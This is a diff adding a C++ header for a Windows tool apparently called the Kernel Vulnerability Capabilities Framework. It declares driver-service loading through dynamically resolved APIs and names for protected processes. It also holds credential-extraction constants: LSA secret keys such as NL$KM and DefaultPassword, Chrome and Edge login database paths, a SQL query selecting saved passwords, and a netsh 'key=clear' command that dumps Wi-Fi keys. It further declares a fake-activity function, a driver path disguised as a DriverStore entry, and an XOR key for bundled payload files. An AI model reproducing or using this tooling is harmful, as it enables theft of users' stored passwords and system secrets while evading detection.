@@ -1,0 +1,213 @@
+#pragma once
+
+#include <Windows.h>
+#include <winternl.h>
+#include <DbgHelp.h>
+#include <Shellapi.h>
+#include <Shlobj.h>
+#include <accctrl.h>
+#include <aclapi.h>
+#include <iostream>
+#include <string>
+#include <optional>
+#include <sstream>
+#include <array>
+#include <chrono>
+#include <memory>
+
+#ifdef BUILD_DATE
+    #define __DATE__ BUILD_DATE
+#endif
+
+#ifdef BUILD_TIME  
+    #define __TIME__ BUILD_TIME
+#endif
+
+#define kvc_DEBUG_ENABLED 0
+
+#ifdef ERROR
+#undef ERROR
+#endif
+
+// Smart module handle management
+struct ModuleDeleter {
+    void operator()(HMODULE mod) const noexcept {
+        if (mod) {
+            FreeLibrary(mod);
+        }
+    }
+};
+
+struct SystemModuleDeleter {
+    void operator()(HMODULE) const noexcept {
+        // System modules obtained via GetModuleHandle don't need to be freed
+    }
+};
+
+using ModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, ModuleDeleter>;
+using SystemModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, SystemModuleDeleter>;
+
+// Logging system with message formatting
+template<typename... Args>
+void PrintMessage(const wchar_t* prefix, const wchar_t* format, Args&&... args)
+{
+    std::wstringstream ss;
+    ss << prefix;
+    
+    if constexpr (sizeof...(args) == 0)
+    {
+        ss << format;
+    }
+    else
+    {
+        wchar_t buffer[1024];
+        swprintf_s(buffer, format, std::forward<Args>(args)...);
+        ss << buffer;
+    }
+    
+    ss << L"\r\n";
+    std::wcout << ss.str();
+}
+
+#if kvc_DEBUG_ENABLED
+    #define DEBUG(format, ...) PrintMessage(L"[DEBUG] ", format, __VA_ARGS__)
+#else
+    #define DEBUG(format, ...) do {} while(0)
+#endif
+
+#define ERROR(format, ...) PrintMessage(L"[-] ", format, __VA_ARGS__)
+#define INFO(format, ...) PrintMessage(L"[*] ", format, __VA_ARGS__)
+#define SUCCESS(format, ...) PrintMessage(L"[+] ", format, __VA_ARGS__)
+
+#define LASTERROR(f) \
+    do { \
+        wchar_t buf[256]; \
+        swprintf_s(buf, L"[-] The function '%s' failed with error code 0x%08x.\r\n", L##f, GetLastError()); \
+        std::wcout << buf; \
+    } while(0)
+
+// Windows protection type definitions
+enum class PS_PROTECTED_TYPE : UCHAR
+{
+    None = 0,
+    ProtectedLight = 1,
+    Protected = 2
+};
+
+enum class PS_PROTECTED_SIGNER : UCHAR
+{
+    None = 0,
+    Authenticode = 1,
+    CodeGen = 2,
+    Antimalware = 3,
+    Lsa = 4,
+    Windows = 5,
+    WinTcb = 6,
+    WinSystem = 7,
+    App = 8,
+    Max = 9
+};
+
+// Service-related constants
+namespace ServiceConstants {
+    constexpr const wchar_t* SERVICE_NAME = L"KernelVulnerabilityControl";
+    constexpr const wchar_t* SERVICE_DISPLAY_NAME = L"Kernel Vulnerability Capabilities Framework";
+    constexpr const wchar_t* SERVICE_PARAM = L"--service";
+    
+    // Keyboard hook settings
+    constexpr int CTRL_SEQUENCE_LENGTH = 5;
+    constexpr DWORD CTRL_SEQUENCE_TIMEOUT_MS = 2000;
+    constexpr DWORD CTRL_DEBOUNCE_MS = 50;
+}
+
+// DPAPI constants for password extraction
+namespace DPAPIConstants {
+    constexpr int SQLITE_OK = 0;
+    constexpr int SQLITE_ROW = 100;
+    constexpr int SQLITE_DONE = 101;
+    constexpr int SQLITE_OPEN_READONLY = 0x00000001;
+    
+    inline std::string GetChromeV10Prefix() { return "v10"; }
+    inline std::string GetChromeDPAPIPrefix() { return "DPAPI"; }
+    
+    inline std::wstring GetSecurityPolicySecrets() { return L"SECURITY\\Policy\\Secrets"; }
+    inline std::wstring GetDPAPISystemKey() { return L"DPAPI_SYSTEM"; }
+    inline std::wstring GetNLKMKey() { return L"NL$KM"; }
+    inline std::wstring GetDefaultPasswordKey() { return L"DefaultPassword"; }
+    
+    inline std::wstring GetCurrVal() { return L"CurrVal"; }
+    inline std::wstring GetOldVal() { return L"OldVal"; }
+    
+    inline std::wstring GetChromeUserData() { return L"\\Google\\Chrome\\User Data"; }
+    inline std::wstring GetEdgeUserData() { return L"\\Microsoft\\Edge\\User Data"; }
+    inline std::wstring GetLocalStateFile() { return L"\\Local State"; }
+    inline std::wstring GetLoginDataFile() { return L"\\Login Data"; }
+    
+    inline std::string GetEncryptedKeyField() { return "\"encrypted_key\":"; }
+    
+    inline std::string GetLocalAppData() { return "LOCALAPPDATA"; }
+    
+    inline std::wstring GetHTMLExt() { return L".html"; }
+    inline std::wstring GetTXTExt() { return L".txt"; }
+    inline std::wstring GetDBExt() { return L".db"; }
+    
+    inline std::wstring GetTempLoginDB() { return L"temp_login_data.db"; }
+    inline std::wstring GetTempPattern() { return L"temp_login_data"; }
+    
+    inline std::string GetNetshShowProfiles() { return "netsh wlan show profiles"; }
+    inline std::string GetNetshShowProfileKey() { return "netsh wlan show profile name=\""; }
+    inline std::string GetNetshKeyClear() { return "\" key=clear"; }
+    
+    inline std::string GetWiFiProfileMarker() { return "All User Profile"; }
+    inline std::string GetWiFiKeyContent() { return "Key Content"; }
+    
+    inline std::string GetLoginQuery() { return "SELECT origin_url, username_value, password_value FROM logins"; }
+    
+    inline std::wstring GetStatusDecrypted() { return L"DECRYPTED"; }
+    inline std::wstring GetStatusClearText() { return L"CLEAR_TEXT"; }
+    inline std::wstring GetStatusEncrypted() { return L"ENCRYPTED"; }
+    inline std::wstring GetStatusFailed() { return L"FAILED"; }
+    inline std::wstring GetStatusExtracted() { return L"EXTRACTED"; }
+}
+
+// Dynamic API loading globals for driver operations
+extern ModuleHandle g_advapi32;
+extern SystemModuleHandle g_kernel32;
+extern decltype(&CreateServiceW) g_pCreateServiceW;
+extern decltype(&OpenServiceW) g_pOpenServiceW;
+extern decltype(&StartServiceW) g_pStartServiceW;
+extern decltype(&DeleteService) g_pDeleteService;
+extern decltype(&CreateFileW) g_pCreateFileW;
+extern decltype(&ControlService) g_pControlService;
+
+// Service mode detection
+extern bool g_serviceMode;
+extern volatile bool g_interrupted;
+
+// Core driver functions
+bool InitDynamicAPIs() noexcept;
+std::wstring GetServiceName() noexcept;
+std::wstring GetDriverFileName() noexcept;
+void GenerateFakeActivity() noexcept;
+std::wstring GetSystemTempPath() noexcept;
+
+// Service utility functions
+bool IsServiceInstalled() noexcept;
+bool IsServiceRunning() noexcept;
+std::wstring GetCurrentExecutablePath() noexcept;
+
+// Driver path helper
+inline std::wstring GetDriverStorePath() noexcept {
+    wchar_t windowsDir[MAX_PATH];
+    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
+        wcscpy_s(windowsDir, L"C:\\Windows");
+    }
+    std::wstring result = windowsDir;
+    return result + L"\\System32\\DriverStore\\FileRepository\\avc.inf_amd64_12ca23d60da30d59";
+}
+
+// KVC combined binary processing constants
+constexpr std::array<BYTE, 7> KVC_XOR_KEY = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
+constexpr wchar_t KVC_DATA_FILE[]  = L"kvc.dat";
+constexpr wchar_t KVC_PASS_FILE[]  = L"kvc_pass.exe";
+constexpr wchar_t KVC_CRYPT_FILE[] = L"kvc_crypt.dll";
